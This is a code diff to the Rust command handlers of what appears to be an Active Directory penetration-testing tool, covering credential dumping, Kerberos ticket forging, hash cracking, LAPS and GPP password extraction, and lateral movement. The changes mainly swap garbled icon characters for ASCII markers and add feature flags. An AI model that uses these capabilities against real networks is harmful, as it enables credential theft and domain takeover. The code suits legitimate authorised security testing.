@@ -15,8 +15,11 @@ use overthrone_core::graph::AttackGraph;
 use overthrone_core::plugin::{PluginContext, PluginRegistry};
 use overthrone_core::proto::rid::{RidAccountType, RidCycleConfig, rid_cycle};
 use overthrone_core::proto::secretsdump::{dump_dcc2, dump_lsa, dump_sam};
+#[cfg(feature = "crawler")]
 use overthrone_crawler::{CrawlerConfig, run_crawler};
+#[cfg(feature = "reaper")]
 use overthrone_reaper::laps::enumerate_laps;
+#[cfg(feature = "reaper")]
 use overthrone_reaper::runner::ReaperConfig;
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
@@ -52,8 +55,8 @@ fn wants_json(cli: &Cli) -> bool {
 
 pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
     banner::print_module_banner("DUMP");
-    println!("  {} Target: {}", "Ã¢â€“Â¸".bright_black(), target.cyan());
-    println!("  {} Source: {:?}", "Ã¢â€“Â¸".bright_black(), source);
+    println!("  {} Target: {}", ">".bright_black(), target.cyan());
+    println!("  {} Source: {:?}", ">".bright_black(), source);
 
     let creds = match crate::require_creds(cli) {
         Ok(c) => c,
@@ -62,7 +65,7 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
 
     println!(
         "  {} Authenticating as {}\\{}",
-        "Ã¢â€“Â¸".bright_black(),
+        ">".bright_black(),
         creds.domain.cyan(),
         creds.username.cyan()
     );
@@ -124,7 +127,7 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
         compensation: None,
     };
 
-    println!("  {} {}", "Ã¢â€“Â¸".bright_black(), description.cyan());
+    println!("  {} {}", ">".bright_black(), description.cyan());
 
     let result = overthrone_pilot::executor::execute_step(&step, &ctx, &mut state).await;
 
@@ -156,7 +159,7 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
 
         println!(
             "  {} Credentials extracted: {}",
-            "âœ“".green(),
+            "[+]".green(),
             result.new_credentials.to_string().yellow()
         );
 
@@ -164,7 +167,7 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
         for loot in &state.loot {
             println!(
                 "  {} [{}] {} â€” {} entries",
-                "â—†".cyan(),
+                "[*]".cyan(),
                 loot.loot_type.yellow(),
                 loot.source.cyan(),
                 loot.entries.to_string().green()
@@ -208,41 +211,38 @@ pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i
 
     println!(
         "  {} Running checks: {}",
-        "Ã¢â€“Â¸".bright_black(),
+        ">".bright_black(),
         check_list.join(", ").cyan()
     );
 
     if let Some(dc_host) = dc {
         println!(
             "  {} Testing connectivity to DC: {}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             dc_host.cyan()
         );
 
         // Test network connectivity
-        println!(
-            "  {} Checking network connectivity...",
-            "Ã¢â€“Â¸".bright_black()
-        );
+        println!("  {} Checking network connectivity...", ">".bright_black());
         match tokio::net::TcpStream::connect(format!("{}:445", dc_host)).await {
-            Ok(_) => println!("    {} SMB (445): Reachable", "âœ“".green()),
-            Err(e) => println!("    {} SMB (445): Unreachable - {}", "âœ—".red(), e),
+            Ok(_) => println!("    {} SMB (445): Reachable", "[+]".green()),
+            Err(e) => println!("    {} SMB (445): Unreachable - {}", "[-]".red(), e),
         }
 
         match tokio::net::TcpStream::connect(format!("{}:389", dc_host)).await {
-            Ok(_) => println!("    {} LDAP (389): Reachable", "âœ“".green()),
-            Err(e) => println!("    {} LDAP (389): Unreachable - {}", "âœ—".red(), e),
+            Ok(_) => println!("    {} LDAP (389): Reachable", "[+]".green()),
+            Err(e) => println!("    {} LDAP (389): Unreachable - {}", "[-]".red(), e),
         }
 
         match tokio::net::TcpStream::connect(format!("{}:88", dc_host)).await {
-            Ok(_) => println!("    {} Kerberos (88): Reachable", "âœ“".green()),
-            Err(e) => println!("    {} Kerberos (88): Unreachable - {}", "âœ—".red(), e),
+            Ok(_) => println!("    {} Kerberos (88): Reachable", "[+]".green()),
+            Err(e) => println!("    {} Kerberos (88): Unreachable - {}", "[-]".red(), e),
         }
     }
 
     // Check dependencies
     if check_list.contains(&"all".to_string()) || check_list.contains(&"deps".to_string()) {
-        println!("  {} Checking dependencies...", "Ã¢â€“Â¸".bright_black());
+        println!("  {} Checking dependencies...", ">".bright_black());
 
         // Rust toolchain
         match std::process::Command::new("rustc")
@@ -251,15 +251,15 @@ pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i
         {
             Ok(o) if o.status.success() => {
                 let ver = String::from_utf8_lossy(&o.stdout).trim().to_string();
-                println!("    {} Rust toolchain: {}", "âœ“".green(), ver);
+                println!("    {} Rust toolchain: {}", "[+]".green(), ver);
             }
-            _ => println!("    {} Rust toolchain: not found", "âœ—".red()),
+            _ => println!("    {} Rust toolchain: not found", "[-]".red()),
         }
 
         // OpenSSL / crypto
         #[cfg(windows)]
         {
-            println!("    {} Crypto: native Windows CNG/SSPI", "âœ“".green());
+            println!("    {} Crypto: native Windows CNG/SSPI", "[+]".green());
         }
         #[cfg(not(windows))]
         {
@@ -269,11 +269,11 @@ pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i
             {
                 Ok(o) if o.status.success() => {
                     let ver = String::from_utf8_lossy(&o.stdout).trim().to_string();
-                    println!("    {} OpenSSL: {}", "âœ“".green(), ver);
+                    println!("    {} OpenSSL: {}", "[+]".green(), ver);
                 }
                 _ => println!(
                     "    {} OpenSSL: not found (needed on Linux/macOS)",
-                    "âœ—".red()
+                    "[-]".red()
                 ),
             }
 
@@ -297,9 +297,9 @@ pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i
                     .map(|o| o.status.success())
                     .unwrap_or(false);
                 if found {
-                    println!("    {} {}: available ({})", "âœ“".green(), tool, purpose);
+                    println!("    {} {}: available ({})", "[+]".green(), tool, purpose);
                 } else {
-                    println!("    {} {}: not found ({})", "âœ—".red(), tool, purpose);
+                    println!("    {} {}: not found ({})", "[-]".red(), tool, purpose);
                 }
             }
         }
@@ -307,7 +307,7 @@ pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i
         // Kerberos
         #[cfg(windows)]
         {
-            println!("    {} Kerberos: native Windows SSPI", "âœ“".green());
+            println!("    {} Kerberos: native Windows SSPI", "[+]".green());
         }
         #[cfg(not(windows))]
         {
@@ -320,9 +320,9 @@ pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i
                     .map(|o| o.status.success())
                     .unwrap_or(false);
             if krb_found {
-                println!("    {} Kerberos: configured", "âœ“".green());
+                println!("    {} Kerberos: configured", "[+]".green());
             } else {
-                println!("    {} Kerberos: krb5.conf not found", "âœ—".red());
+                println!("    {} Kerberos: krb5.conf not found", "[-]".red());
             }
         }
     }
@@ -335,11 +335,12 @@ pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i
 // cmd_report â€” Report Generation
 // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
+#[cfg(feature = "scribe")]
 pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFormat) -> i32 {
     banner::print_module_banner("REPORT");
-    println!("  {} Input: {}", "Ã¢â€“Â¸".bright_black(), input.cyan());
-    println!("  {} Output: {}", "Ã¢â€“Â¸".bright_black(), output.cyan());
-    println!("  {} Format: {:?}", "Ã¢â€“Â¸".bright_black(), format);
+    println!("  {} Input: {}", ">".bright_black(), input.cyan());
+    println!("  {} Output: {}", ">".bright_black(), output.cyan());
+    println!("  {} Format: {:?}", ">".bright_black(), format);
 
     // All formats require loading the engagement session from the input file
     let input_path = std::path::Path::new(input);
@@ -370,10 +371,7 @@ pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFor
 
     match format {
         ReportFormat::Markdown => {
-            println!(
-                "  {} Generating Markdown report...",
-                "Ã¢â€“Â¸".bright_black()
-            );
+            println!("  {} Generating Markdown report...", ">".bright_black());
             let report_content = overthrone_scribe::markdown::render(&session);
 
             if let Err(e) = tokio::fs::write(output, &report_content).await {
@@ -383,13 +381,13 @@ pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFor
 
             println!(
                 "  {} Markdown generated ({:.1} KB, {} findings)",
-                "âœ“".green(),
+                "[+]".green(),
                 report_content.len() as f64 / 1024.0,
                 session.findings.len()
             );
         }
         ReportFormat::Json => {
-            println!("  {} Generating JSON report...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Generating JSON report...", ">".bright_black());
             let report_json = match serde_json::to_string_pretty(&session) {
                 Ok(j) => j,
                 Err(e) => {
@@ -405,13 +403,13 @@ pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFor
 
             println!(
                 "  {} JSON generated ({:.1} KB, {} findings)",
-                "âœ“".green(),
+                "[+]".green(),
                 report_json.len() as f64 / 1024.0,
                 session.findings.len()
             );
         }
         ReportFormat::Pdf => {
-            println!("  {} Generating PDF report...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Generating PDF report...", ">".bright_black());
 
             let pdf_bytes = match overthrone_scribe::pdf::render(&session) {
                 Ok(bytes) => bytes,
@@ -428,7 +426,7 @@ pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFor
 
             println!(
                 "  {} PDF generated ({:.1} KB, {} findings)",
-                "âœ“".green(),
+                "[+]".green(),
                 pdf_bytes.len() as f64 / 1024.0,
                 session.findings.len()
             );
@@ -493,7 +491,7 @@ pub async fn cmd_module_list(cli: &Cli, category: Option<&str>) -> i32 {
     println!("\n{}", "Available Modules:".yellow().bold());
     println!(
         "{}",
-        "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€".dimmed()
+        "-------------------------------------------------".dimmed()
     );
 
     let mut current_cat = String::new();
@@ -514,11 +512,7 @@ pub async fn cmd_module_list(cli: &Cli, category: Option<&str>) -> i32 {
                 .dimmed()
             );
         }
-        let cred_icon = if m.requires_creds {
-            "Ã°Å¸â€Â"
-        } else {
-            "Ã°Å¸â€â€œ"
-        };
+        let cred_icon = if m.requires_creds { "[P]" } else { "[U]" };
         println!(
             "    {} {} {}",
             cred_icon,
@@ -694,7 +688,7 @@ pub async fn cmd_module_run(
             }
             if !out.stdout.is_empty() || !out.stderr.is_empty() {
                 println!("\n{}", "Output:".yellow().bold());
-                println!("{}", "â”€â”€â”€â”€â”€â”€â”€".dimmed());
+                println!("{}", "-------".dimmed());
                 if !out.stdout.is_empty() {
                     println!("{}", out.stdout);
                 }
@@ -802,12 +796,12 @@ pub async fn cmd_module_run_parallel(
     }
 
     println!("\n{}", "Results:".yellow().bold());
-    println!("{}", "â”€â”€â”€â”€â”€â”€â”€â”€".dimmed());
+    println!("{}", "--------".dimmed());
     for r in &results {
         let icon = if r.success {
-            "[âœ“]".green()
+            "[+]".green()
         } else {
-            "[âœ—]".red()
+            "[-]".red()
         };
         println!(
             "  {} {} â€” {}",
@@ -828,6 +822,7 @@ pub async fn cmd_module_run_parallel(
 // cmd_forge â€” Ticket Forging
 // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
+#[cfg(feature = "forge")]
 pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
     banner::print_module_banner("FORGE");
 
@@ -844,22 +839,18 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
             krbtgt_hash,
             output,
         } => {
-            println!("  {} Forging Golden Ticket...", "Ã¢â€“Â¸".bright_black());
-            println!("  {} Domain: {}", "Ã¢â€“Â¸".bright_black(), domain.cyan());
-            println!(
-                "  {} Domain SID: {}",
-                "Ã¢â€“Â¸".bright_black(),
-                domain_sid.cyan()
-            );
+            println!("  {} Forging Golden Ticket...", ">".bright_black());
+            println!("  {} Domain: {}", ">".bright_black(), domain.cyan());
+            println!("  {} Domain SID: {}", ">".bright_black(), domain_sid.cyan());
             println!(
                 "  {} User: {} (RID: {})",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 user.cyan(),
                 rid
             );
             println!(
                 "  {} krbtgt hash: {}...",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 &krbtgt_hash[..8.min(krbtgt_hash.len())].cyan()
             );
 
@@ -908,23 +899,19 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
             service_hash,
             output,
         } => {
-            println!("  {} Forging Silver Ticket...", "Ã¢â€“Â¸".bright_black());
-            println!("  {} Domain: {}", "Ã¢â€“Â¸".bright_black(), domain.cyan());
-            println!(
-                "  {} Domain SID: {}",
-                "Ã¢â€“Â¸".bright_black(),
-                domain_sid.cyan()
-            );
+            println!("  {} Forging Silver Ticket...", ">".bright_black());
+            println!("  {} Domain: {}", ">".bright_black(), domain.cyan());
+            println!("  {} Domain SID: {}", ">".bright_black(), domain_sid.cyan());
             println!(
                 "  {} User: {} (RID: {})",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 user.cyan(),
                 rid
             );
-            println!("  {} SPN: {}", "Ã¢â€“Â¸".bright_black(), spn.cyan());
+            println!("  {} SPN: {}", ">".bright_black(), spn.cyan());
             println!(
                 "  {} Service hash: {}...",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 &service_hash[..8.min(service_hash.len())].cyan()
             );
 
@@ -974,9 +961,10 @@ pub async fn cmd_crack(
     mode: CrackMode,
     wordlist: Option<&str>,
     max_candidates: usize,
+    hashcat: bool,
 ) -> i32 {
     banner::print_module_banner("CRACK");
-    println!("  {} Mode: {:?}", "Ã¢â€“Â¸".bright_black(), mode);
+    println!("  {} Mode: {:?}", ">".bright_black(), mode);
 
     // Setup CrackerConfig
     let mut config = match mode {
@@ -985,14 +973,16 @@ pub async fn cmd_crack(
         CrackMode::Default => overthrone_core::crypto::cracker::CrackerConfig::default(),
     };
 
+    config.prefer_hashcat = hashcat;
+
     if let Some(w) = wordlist {
-        println!("  {} Wordlist: {}", "Ã¢â€“Â¸".bright_black(), w.cyan());
+        println!("  {} Wordlist: {}", ">".bright_black(), w.cyan());
         config.custom_wordlist = Some(w.to_string());
         config.use_embedded = false;
     } else {
         println!(
             "  {} Wordlist: {}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             "Embedded Top-10K".cyan()
         );
     }
@@ -1029,13 +1019,13 @@ pub async fn cmd_crack(
 
     // Process single hash
     if let Some(hash_str) = hash {
-        println!("  {} Cracking hash...", "Ã¢â€“Â¸".bright_black());
+        println!("  {} Cracking hash...", ">".bright_black());
 
         match parse_hash(hash_str) {
             Ok(hash_type) => {
                 let result = cracker.crack(&hash_type);
                 if result.cracked {
-                    println!("\n  {} Hash cracked successfully!", "âœ“".green());
+                    println!("\n  {} Hash cracked successfully!", "[+]".green());
                     if let Some(u) = result.username {
                         println!("    User:      {}", u.cyan());
                     }
@@ -1062,7 +1052,7 @@ pub async fn cmd_crack(
         // Process file of hashes
         println!(
             "  {} Loading hashes from: {}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             file_path.cyan()
         );
 
@@ -1089,19 +1079,19 @@ pub async fn cmd_crack(
                     return 1;
                 }
 
-                println!("  {} Loaded {} valid hash(es)", "âœ“".green(), hashes.len());
-                println!("  {} Starting parallel crack...", "Ã¢â€“Â¸".bright_black());
+                println!("  {} Loaded {} valid hash(es)", "[+]".green(), hashes.len());
+                println!("  {} Starting parallel crack...", ">".bright_black());
 
                 let results = cracker.crack_batch(&hashes);
                 let cracked_count = results.iter().filter(|r| r.cracked).count();
 
-                println!("\n  {} Results:", "Ã¢â€“Â¸".bright_black());
+                println!("\n  {} Results:", ">".bright_black());
                 for result in &results {
                     if result.cracked {
                         let user = result.username.as_deref().unwrap_or("unknown");
                         println!(
                             "    {} {} ({}) -> {}",
-                            "âœ“".green(),
+                            "[+]".green(),
                             user.cyan(),
                             result.hash_type.dimmed(),
                             result.password.as_deref().unwrap_or("").yellow()
@@ -1112,7 +1102,7 @@ pub async fn cmd_crack(
                 println!(
                     "\n  {} Summary: Cracked {}/{} hashes",
                     if cracked_count > 0 {
-                        "âœ“".green()
+                        "[+]".green()
                     } else {
                         "!".yellow()
                     },
@@ -1142,15 +1132,11 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
     banner::print_module_banner("RID CYCLING");
     println!(
         "  {} RID range: {} - {}",
-        "Ã¢â€“Â¸".bright_black(),
+        ">".bright_black(),
         start_rid,
         end_rid
     );
-    println!(
-        "  {} Null session: {}",
-        "Ã¢â€“Â¸".bright_black(),
-        null_session
-    );
+    println!("  {} Null session: {}", ">".bright_black(), null_session);
 
     let dc = match crate::require_dc(cli) {
         Ok(d) => d,
@@ -1167,17 +1153,17 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
         }
     };
 
-    println!("  {} Target DC: {}", "Ã¢â€“Â¸".bright_black(), dc.cyan());
+    println!("  {} Target DC: {}", ">".bright_black(), dc.cyan());
     if !creds_list.is_empty() {
         println!(
             "  {} Credential sets: {}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             creds_list.len().to_string().yellow()
         );
     }
     println!(
         "  {} Starting RID enumeration via MS-SAMR...",
-        "Ã¢â€“Â¸".bright_black()
+        ">".bright_black()
     );
 
     let mut all_results = Vec::new();
@@ -1215,7 +1201,7 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
         }
         println!(
             "  {} Trying credential set {}/{}: {}\\{}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             i + 1,
             creds_list.len(),
             creds.domain.cyan(),
@@ -1294,11 +1280,11 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
     println!("\n{}", "RID Cycling Results:".yellow().bold());
     println!(
         "{}",
-        "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€".dimmed()
+        "-------------------------------------------------".dimmed()
     );
     println!(
         "  {} Total: {} | Users: {} | Groups: {} | Aliases: {}",
-        "â—†".cyan(),
+        "[*]".cyan(),
         results.len().to_string().green().bold(),
         users.to_string().green(),
         groups.to_string().yellow(),
@@ -1316,7 +1302,7 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
         for r in &user_results {
             println!(
                 "    {} RID {:>5}: {}",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 r.rid,
                 r.name.cyan()
             );
@@ -1334,7 +1320,7 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
         for r in &group_results {
             println!(
                 "    {} RID {:>5}: {}",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 r.rid,
                 r.name.cyan()
             );
@@ -1352,7 +1338,7 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
         for r in &alias_results {
             println!(
                 "    {} RID {:>5}: {}",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 r.rid,
                 r.name.cyan()
             );
@@ -1369,6 +1355,7 @@ pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool
 // cmd_move â€” Lateral Movement
 // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
+#[cfg(feature = "reaper")]
 pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
     banner::print_module_banner("MOVE");
 
@@ -1398,10 +1385,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
 
     match action {
         MoveAction::Trusts => {
-            println!(
-                "  {} Enumerating domain trusts...",
-                "Ã¢â€“Â¸".bright_black()
-            );
+            println!("  {} Enumerating domain trusts...", ">".bright_black());
             // Run reaper first to get trust data
             let reaper_config = ReaperConfig {
                 dc_ip: dc.clone(),
@@ -1418,7 +1402,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
             match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                 Ok(reaper_result) => {
                     let trust_count = reaper_result.trusts.len();
-                    println!("  {} Found {} trust(s)", "âœ“".green(), trust_count);
+                    println!("  {} Found {} trust(s)", "[+]".green(), trust_count);
 
                     for trust in &reaper_result.trusts {
                         println!(
@@ -1457,7 +1441,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
         MoveAction::Escalation => {
             println!(
                 "  {} Finding cross-domain escalation paths...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
 
             // Run reaper for data, then crawler for analysis
@@ -1484,7 +1468,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
                             let path_count = crawler_result.escalation_paths.len();
                             println!(
                                 "  {} Found {} escalation path(s)",
-                                "âœ“".green(),
+                                "[+]".green(),
                                 path_count
                             );
 
@@ -1505,10 +1489,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
 
                             // Also show foreign memberships
                             if !crawler_result.foreign_memberships.is_empty() {
-                                println!(
-                                    "\n  {} Foreign group memberships:",
-                                    "Ã¢â€“Â¸".bright_black()
-                                );
+                                println!("\n  {} Foreign group memberships:", ">".bright_black());
                                 for fm in &crawler_result.foreign_memberships {
                                     println!(
                                         "    {}\\{} -> {} ({})",
@@ -1542,10 +1523,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
             }
         }
         MoveAction::Mssql => {
-            println!(
-                "  {} Analyzing MSSQL linked servers...",
-                "Ã¢â€“Â¸".bright_black()
-            );
+            println!("  {} Analyzing MSSQL linked servers...", ">".bright_black());
 
             let reaper_config = ReaperConfig {
                 dc_ip: dc.clone(),
@@ -1565,7 +1543,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
                         let chain_count = crawler_result.mssql_chains.len();
                         println!(
                             "  {} Found {} MSSQL link chain(s)",
-                            "âœ“".green(),
+                            "[+]".green(),
                             chain_count
                         );
 
@@ -1606,7 +1584,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
             }
         }
         MoveAction::Map => {
-            println!("  {} Generating trust map...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Generating trust map...", ">".bright_black());
 
             let reaper_config = ReaperConfig {
                 dc_ip: dc.clone(),
@@ -1624,7 +1602,7 @@ pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
                 Ok(reaper_result) => {
                     match run_crawler(&crawler_config, &reaper_result).await {
                         Ok(crawler_result) => {
-                            println!("  {} Trust map generated", "âœ“".green());
+                            println!("  {} Trust map generated", "[+]".green());
 
                             // Print ASCII art trust map
                             let graph = &crawler_result.trust_map;
@@ -1714,7 +1692,7 @@ pub async fn cmd_gpp(cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> 
     if let Some(cpass) = cpassword {
         println!(
             "  {} Decrypting cpassword: {}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             cpass.cyan()
         );
 
@@ -1733,7 +1711,7 @@ pub async fn cmd_gpp(cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> 
                 }
                 println!(
                     "  {} Decrypted password: {}",
-                    "âœ“".green(),
+                    "[+]".green(),
                     password.yellow()
                 );
                 banner::print_success("GPP decryption completed");
@@ -1757,7 +1735,7 @@ pub async fn cmd_gpp(cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> 
     } else if let Some(file_path) = file {
         println!(
             "  {} Parsing GPP file: {}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             file_path.cyan()
         );
 
@@ -1805,7 +1783,7 @@ pub async fn cmd_gpp(cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> 
                     );
                 }
 
-                println!("  {} Found {} credential(s)", "âœ“".green(), creds.len());
+                println!("  {} Found {} credential(s)", "[+]".green(), creds.len());
                 for cred in &creds {
                     println!("    {}: {}", cred.username.cyan(), cred.password.yellow());
                     if !cred.changed.is_empty() {
@@ -1854,6 +1832,7 @@ pub async fn cmd_gpp(cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> 
 // cmd_laps â€” LAPS Password Reading
 // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
+#[cfg(feature = "reaper")]
 pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
     banner::print_module_banner("LAPS");
 
@@ -1883,13 +1862,13 @@ pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
     if let Some(comp) = computer {
         println!(
             "  {} Querying LAPS password for: {}",
-            "Ã¢â€“Â¸".bright_black(),
+            ">".bright_black(),
             comp.cyan()
         );
     } else {
         println!(
             "  {} Enumerating all LAPS passwords via LDAP...",
-            "Ã¢â€“Â¸".bright_black()
+            ">".bright_black()
         );
     }
 
@@ -1946,7 +1925,7 @@ pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
                 for entry in &filtered {
                     println!(
                         "  {} {} ({})",
-                        "âœ“".green(),
+                        "[+]".green(),
                         entry.computer_name.cyan(),
                         if entry.is_laps_v2 {
                             "LAPSv2".dimmed()
@@ -1965,16 +1944,16 @@ pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
             } else {
                 println!(
                     "  {} Found {} LAPS-enabled computers ({} readable)",
-                    "âœ“".green(),
+                    "[+]".green(),
                     total,
                     readable.len()
                 );
 
                 for entry in &entries {
                     let status = if entry.password.is_some() {
-                        "âœ“".green()
+                        "[+]".green()
                     } else {
-                        "âœ—".red()
+                        "[-]".red()
                     };
                     println!(
                         "  {} {} ({})",
@@ -2022,7 +2001,7 @@ pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
 
     match action {
         SecretsAction::Sam { sam, system } => {
-            println!("  {} Dumping SAM hive...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Dumping SAM hive...", ">".bright_black());
             println!("    SAM: {}", sam.cyan());
             println!("    SYSTEM: {}", system.cyan());
 
@@ -2048,7 +2027,7 @@ pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
                 Ok(credentials) => {
                     println!(
                         "  {} Extracted {} account(s)",
-                        "âœ“".green(),
+                        "[+]".green(),
                         credentials.len()
                     );
                     for cred in &credentials {
@@ -2081,7 +2060,7 @@ pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
             0
         }
         SecretsAction::Lsa { security, system } => {
-            println!("  {} Dumping LSA secrets...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Dumping LSA secrets...", ">".bright_black());
             println!("    SECURITY: {}", security.cyan());
             println!("    SYSTEM: {}", system.cyan());
 
@@ -2107,7 +2086,7 @@ pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
                 Ok(credentials) => {
                     println!(
                         "  {} Extracted {} secret(s)",
-                        "âœ“".green(),
+                        "[+]".green(),
                         credentials.len()
                     );
                     for cred in &credentials {
@@ -2130,7 +2109,7 @@ pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
             0
         }
         SecretsAction::Dcc2 { security, system } => {
-            println!("  {} Dumping DCC2 (mscash2)...", "Ã¢â€“Â¸".bright_black());
+            println!("  {} Dumping DCC2 (mscash2)...", ">".bright_black());
             println!("    SECURITY: {}", security.cyan());
             println!("    SYSTEM: {}", system.cyan());
 
@@ -2156,7 +2135,7 @@ pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
                 Ok(credentials) => {
                     println!(
                         "  {} Extracted {} cached credential(s)",
-                        "âœ“".green(),
+                        "[+]".green(),
                         credentials.len()
                     );
                     for cred in &credentials {
@@ -2190,7 +2169,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
         AdcsAction::Enum { ca } => {
             println!(
                 "  {} Enumerating ADCS configuration via LDAP...",
-                "Ã¢â€“Â¸".bright_black()
+                ">".bright_black()
             );
             if let Some(ca_name) = ca {
                 println!("    CA filter: {}", ca_name.cyan());
@@ -2271,13 +2250,13 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 
             println!(
                 "\n  {} Certificate Authorities ({})",
-                "Ã¢â€“Â¸".bright_black(),
+                ">".bright_black(),
                 cas.len()
             );
             for ca_info in &cas {
                 println!(
                     "    {} {} ({})",
-                    "âœ“".green(),
+                    "[+]".green(),
                     ca_info.name.cyan(),
                     ca_info.dn.dimmed()
                 );
@@ -2291,7 +2270,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 
             println!(
                 "\n  {} Certificate Templates ({})",
